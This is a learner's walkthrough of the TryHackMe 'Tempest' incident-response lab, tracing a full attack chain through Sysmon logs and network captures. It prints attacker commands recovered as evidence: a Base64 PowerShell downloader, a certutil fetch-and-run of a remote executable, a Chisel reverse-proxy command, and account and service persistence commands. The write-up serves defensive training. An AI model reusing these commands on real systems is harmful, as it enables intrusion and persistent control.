# [SIEM Triage for SOC]

**TryHackMe Path**: [SOC Level 1]  
**Lab Topic**: [Tempest]  
**Date Completed**: [04/30/2026]

---

## 🧠 Summary

> In this lab, I learned how to conduct an investigation on a workstation affected by a full attack chain.

---

## 🎯 Objectives
- [ ] Complete Challenge Room
      
---

## 🧰 Tools Used
- THM AttackBox
- Splunk
- VirusTotal
- Event Viewer
- Brim
- Timeline Explorer
- Wireshark
- PowerShell

---

## 📊 Analysis & Screenshots

*** Preparation - Tools and Artefacts ***

> In this room, I played the role of an incident responder focused on handling and analyzing the captured artifacts of a compromised machine. For the first section, I had to answer questions based on the artifacts and tools needed for the investigation. For the first question, I had to figure out the SHA256 hash of the capture.pcapng file. I retrieved the SHA256 hash by launching PowerShell and inputting the command syntax `Get-FileHash .\capture.pcapng`, which returned:
>
> `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6.`
>
> <img width="892" height="879" alt="1" src="https://github.com/user-attachments/assets/df453969-50b6-4323-8ce1-a10469126050" />

> For the next question, I retrieved the SHA256 hash of the sysmon.evtx file, which was:
>
> `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F.`
>
> <img width="1036" height="147" alt="2" src="https://github.com/user-attachments/assets/abd891ab-8058-463a-95ff-1a0e9a901fa6" />

> For the last question of this section, I retrieved the SHA256 hash of the windows.evtx file, which was:
>
> `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60.`
>
> <img width="1100" height="135" alt="3" src="https://github.com/user-attachments/assets/7ed2cc95-4d2e-4f64-b89c-2bbe05eaff16" />

*** Initial Access - Malicious Document ***

> For this section, I had to investigate an alert that an analyst labeled as "CRITICAL" severity. I had to use the Sysmon data source.
>
> For the first question, I had to figure out which malicious document compromised the user of this machine. After further investigation, I was able to identify the malicious document as:
>
> `free_magicules.doc`
>
> <img width="1152" height="647" alt="4" src="https://github.com/user-attachments/assets/00ad8403-7b97-486b-93cc-4b0169218775" />
> <img width="786" height="355" alt="5" src="https://github.com/user-attachments/assets/c13c279a-39bd-494aee2fa" />
> <img width="1245" height="465" alt="6" src="https://github.com/user-attachments/assets/ff5728de-9af5-4afd-94a4-ec063e4504eb" />

> Moving on to the next question, I was able to identify the compromised user and machine as:
>
> `benimaru-TEMPEST`
>
> <img width="1022" height="360" alt="7" src="https://github.com/user-attachments/assets/17e84ef2-fe15-469b-a8ad-e9872b2cd4a3" />

> The PID of the Microsoft Word process that opened the malicious document was discovered to be `496` within the Payload Data1 column.
>
> <img width="727" height="292" alt="8" src="https://github.com/user-attachments/assets/09e58590-0bbd-4bcc-a1e2-446c3a35deb1" />

> For the next question, based on the Sysmon logs, the IPv4 address resolved by the malicious domain was discovered to be:
>
> `167.71.199.191`
>
> <img width="1076" height="550" alt="9" src="https://github.com/user-attachments/assets/40247c58-ca95-4695-a9fa-c86a9eb358b9" />

> Moving on, I retrieved the Base64-encoded string in the malicious payload executed by the document:
>
> `NhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==`
>
> <img width="1131" height="658" alt="10" src="https://github.com/user-attachments/assets/97e29add-ad88-4186-959c-50d66c6ddb1a" />

> I then identified the CVE number of the exploit used by the attacker to achieve remote code execution as:
>
> `CVE-2022-30190`
>
> I retrieved this by locating the binary with the same Base64 string and then inputting the binary into the LOLBAS website.
>
> <img width="1166" height="563" alt="11" src="https://github.com/user-attachments/assets/b7b95b57-9779-472c-b8a3-415fdebd5153" />
> <img width="1119" height="478" alt="12" src="https://github.com/user-attachments/assets/6ba876b0-be95-4240-847c-cc1ff23b4cbc" />
> <img width="1113" height="200" alt="13" src="https://github.com/user-attachments/assets/3b134a7b-db4c-4228-bf21-cfd65467fd89" />

*** Initial Access - Stage 2 Execution *** 

> Moving on, I had to answer a few questions based on Stage 2 execution after discovering the initial findings. For the first question, I had to figure out the full target path of the payload that was written by the malicious execution. This payload wrote a file on the system.
>
> To figure this out, I inputted `appdata` into the search field of the Timeline Explorer application. After investigating the events under Event ID 11, I retrieved the full target path as:
>
> `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
>
> <img width="406" height="213" alt="14" src="https://github.com/user-attachments/assets/0ed5d1d8-b8e2-4835-b216-710d7dfb072b" />
> <img width="376" height="140" alt="15" src="https://github.com/user-attachments/assets/56a02b6c-dfa9-4d2d-b068-85e733e35ac8" />
> <img width="849" height="315" alt="16" src="https://github.com/user-attachments/assets/5d4f6bb1-6ae8-4cbb-9079-9ea88cc72b65" />

> I then retrieved the command executed upon successful login of the compromised user:
>
> `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`
>
> <img width="1153" height="315" alt="17" src="https://github.com/user-attachments/assets/27a74945-8e92-47ab-bb39-61310600144e" />

> Upon investigating the Sysmon logs, I was able to retrieve the SHA256 hash of the malicious binary downloaded for Stage 2 execution:
>
> `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`
>
> <img width="559" height="187" alt="18" src="https://github.com/user-attachments/assets/b4dfd55b-c333-40e4-89f0-63110696cd3b" />
> <img width="994" height="310" alt="19" src="https://github.com/user-attachments/assets/e61e9510-2ee6-4f07-92f3-3df27faf9a6a" />

> Finally, for Stage 2 execution, I discovered the domain and port used by the attacker:
>
> `resolvecyber.xyz:80`
>
> This was identified after the downloaded Stage 2 payload established a connection to a C2 server.
>
> <img width="399" height="159" alt="20" src="https://github.com/user-attachments/assets/dca6be0c-a9b7-48fc-8924-4b2a7cd563a8" />
> <img width="1023" height="320" alt="21" src="https://github.com/user-attachments/assets/5e34c31e-58df-4bb9-876a-f3648b51a90a" />

*** Initial Access - Malicious Document Traffic ***

> Moving on, I had to answer a few questions related to the attacker fetching the Stage 2 payload remotely. For the first question, I had to figure out the URL of the malicious payload embedded in the document.
>
> To figure this out, I launched Brim and inputted the filter:
>
> `_path=="http" "<phishteam.xyz>" GET`
>
> This returned the URL:
>
> `http://phishteam.xyz/02dcf07/index.html`
>
> <img width="1137" height="678" alt="22" src="https://github.com/user-attachments/assets/27e2140a-4f5e-4248-a57d-9028c88c899f" />

> I then discovered that the encoding used by the attacker on the C2 connection was:
>
> `Base64`
>
> <img width="1089" height="470" alt="23" src="https://github.com/user-attachments/assets/53596d60-82fe-41ad-894f-4dd561a42f6c" />
> <img width="1650" height="766" alt="24" src="https://github.com/user-attachments/assets/c1dda3d0-99eb-4279-80b6-9d71c3202500" />

> Further into the investigation, I identified the parameter that contained the executed command results when the malicious C2 binary sent a payload:
>
> `q`
>
> I also identified the URL used by the binary to get the command to be executed:
>
> `/9ab62b5`
>
> This used the `GET` HTTP method.
>
> <img width="476" height="280" alt="25" src="https://github.com/user-attachments/assets/af5157d4-bcfb-4547-8aa7-e37c6deafc8a" />
> <img width="431" height="215" alt="26" src="https://github.com/user-attachments/assets/41b36c15-22f9-4668-b2e0-b7ddc8d9006e" />
> <img width="995" height="234" alt="27" src="https://github.com/user-attachments/assets/40438b8f-6808-4005-be44-4c38ae48a3df" />

> Finally, for this section, I identified the programming language used by the attacker to compile the binary as:
>
> `Nim`
>
> This was based on the user agent.
>
> <img width="501" height="229" alt="28" src="https://github.com/user-attachments/assets/e67b53a3-ab56-41de-9ac4-7b674de21ce5" />

*** Discovery - Internal Reconnaissance ***

> For this section, I had to answer a few questions related to the malicious binary continuously using the C2 traffic based on the collected findings. For the first question, I had to figure out the password discovered in a sensitive file that the attacker located inside the user's machine.
>
> To figure this out, I used the Brim filter:
>
> `_path=="http" "<resolvecyber.xyz>" id.resp_p==<80 | cut ts, host, id.resp_p, uri | sort ts`
>
> After gathering the selected Base64 string and running it through CyberChef, I was able to retrieve the password:
>
> `infernotempest`
>
> <img width="1232" height="739" alt="29" src="https://github.com/user-attachments/assets/da75b3a5-df8f-4e03-96eb-d40d9f879480" />
> <img width="1661" height="856" alt="30" src="https://github.com/user-attachments/assets/47a54efe-72ab-4413-b75e-12cbb824a59a" />
> <img width="1041" height="784" alt="31" src="https://github.com/user-attachments/assets/e42a83a5-df8f-4e03-96eb-d40d9f879480" />

> I then identified port `5985` as the listening port that could provide a remote shell inside the machine. This was a port that the attacker enumerated on the machine.
>
> <img width="1235" height="730" alt="32" src="https://github.com/user-attachments/assets/7e6741cf-6db5-4487-aa40-d1580fe95457" />
> <img width="1154" height="398" alt="33" src="https://github.com/user-attachments/assets/c62ca504-2867-441b-a509-9f19b7ca745b" />
> <img width="989" height="787" alt="34" src="https://github.com/user-attachments/assets/e5c2cde0-644d-440c-aaec-0bd197f71cbe" />

> Moving on, I identified the command executed by the attacker to establish a connection to a reverse SOCKS proxy in order to access the internal services hosted inside the machine:
>
> `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
>
> <img width="1298" height="478" alt="35" src="https://github.com/user-attachments/assets/e1c9b7b9-2ed7-4688-b2f0-63110600144e" />

> The SHA256 hash of the binary used by the attacker to establish the reverse proxy connection was identified as:
>
> `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
>
> <img width="1290" height="554" alt="36" src="https://github.com/user-attachments/assets/9fb65a93-3a74-4e59-811c-8f7ed50a233f" />

> I then used VirusTotal to retrieve the name of the tool used by the attacker. I inputted the SHA256 hash I discovered for the binary into the search field, which returned the tool name:
>
> `Chisel`
>
> <img width="1044" height="738" alt="37" src="https://github.com/user-attachments/assets/6cf39109-e764-43df-bd6" />
> <img width="734" height="506" alt="38" src="https://github.com/user-attachments/assets/cc324ce2-8cb2-4179-9cb6-6b21680de8ad" />

> The attacker then used the `WinRM` service to authenticate. This was based on outside research using ChatGPT.
>
> <img width="945" height="461" alt="39" src="https://github.com/user-attachments/assets/e054580d-a455-4b22-ad65-9f8a583fdbd6" />

*** Privilege Escalation - Exploiting Privileges ***

> Moving on to this section, I had to answer questions related to the attacker gaining a stable shell through a reverse SOCKS proxy. For the first question, I had to figure out the name and SHA256 hash of the binary the attacker downloaded after gaining privilege escalation on the current user.
>
> To figure this out, I inputted the user `benimaru` into the search field of the Timeline Explorer application. I then investigated all events related to the `benimaru` user, which led me to discover the name and SHA256 hash of the binary:
>
> `spf.exe`
>
> `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`
>
> <img width="1253" height="403" alt="40" src="https://github.com/user-attachments/assets/fa779303-1a0c-43c2-bb97-d4d2ac862759" />
> <img width="1142" height="397" alt="41" src="https://github.com/user-attachments/assets/c8707f9e-c6f0-4359-bc0c-69200dbc92f4" />

> Based on the SHA256 hash of the binary, I identified the tool as:
>
> `PrintSpoofer`
>
> I identified this by inputting the hash into VirusTotal.
>
> <img width="993" height="661" alt="42" src="https://github.com/user-attachments/assets/935be8b4-b537-414f-bf76-1a03f5310c01" />
> <img width="919" height="525" alt="43" src="https://github.com/user-attachments/assets/97bda5ee-65d8-4e9d-84be-469e121ea63b" />

> I then identified the privilege exploited by the tool as:
>
> `SeImpersonatePrivilege`
>
> I identified this with the help of ChatGPT.
>
> <img width="899" height="419" alt="44" src="https://github.com/user-attachments/assets/68d69a88-e069-4b22-bc4d-2c051337960f" />

> Moving on, I discovered the name of the binary used to execute the `SeImpersonatePrivilege` tool and establish a C2 connection:
>
> `final.exe`
>
> I found this by further investigating events within the Timeline Explorer application.
>
> <img width="966" height="247" alt="45" src="https://github.com/user-attachments/assets/d5cc4530-0012-415a-b6b4-fa00de5a7e67" />

> Finally, I identified the secondary port the binary connected to as:
>
> `8080`
>
> I identified this by using the Brim filter:
>
> `_path=="http" | cut id.orig_h, id.resp_h, id.resp_p, method, host, uri | uniq -c`
>
> <img width="1250" height="396" alt="46" src="https://github.com/user-attachments/assets/4db6766c-a9b7-48fc-8924-4b2a7cd563a8" />

*** Actions on Objective - Fully Owned Machine ***

> For this final section, I had to answer questions related to the attacker gaining administrative privileges inside the machine. I also had to identify the persistence techniques used by the attacker.
>
> For the first question, I had to figure out the two users created by the attacker upon gaining SYSTEM access. To figure this out, I launched the Windows Event Logs with the Event Viewer application. Upon further investigation of the Event IDs, I discovered the two users created by the attacker:
>
> `shion`
>
> `shuna`
>
> <img width="1241" height="646" alt="47" src="https://github.com/user-attachments/assets/ab8aa6ac-6e28-4dd1-b729-b3de3b70e0cb" />
> <img width="1305" height="651" alt="48" src="https://github.com/user-attachments/assets/87505fbb-fff8-4bd4-80dd-c94d74c39f17" />

> I then identified the missing option that caused the attacker's attempt to fail:
>
> `/add`
>
> <img width="1121" height="875" alt="49" src="https://github.com/user-attachments/assets/00f326e5-1954-437c-b8a26b83b380" />

> I identified Event ID `4720` as the event that demonstrated the creation of these accounts by the attacker.

> Moving on, I discovered the command used by the attacker to add one of the accounts to the local administrators group:
>
> `net localgroup administrators /add shion`
>
> <img width="1328" height="372" alt="50" src="https://github.com/user-attachments/assets/1180e9c9-2ed7-4688-a768-97096ad596f5" />

> The Event ID that indicated the addition to a sensitive group was discovered to be:
>
> `4732`
>
> <img width="1329" height="517" alt="51" src="https://github.com/user-attachments/assets/dcce2185-aff4-4084-9b10-d997ca6568db" />

> The attacker then executed a technique to establish persistent administrative access. The command used by the attacker to achieve this was:
>
> `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`
>
> <img width="1416" height="744" alt="52" src="https://github.com/user-attachments/assets/6fe01088-50cc-4c7b-b241-43c6c58cc46c" />

--- 

## Reflection

> This lab strengthened my ability to conduct an investigation on a workstation affected by a full attack chain.
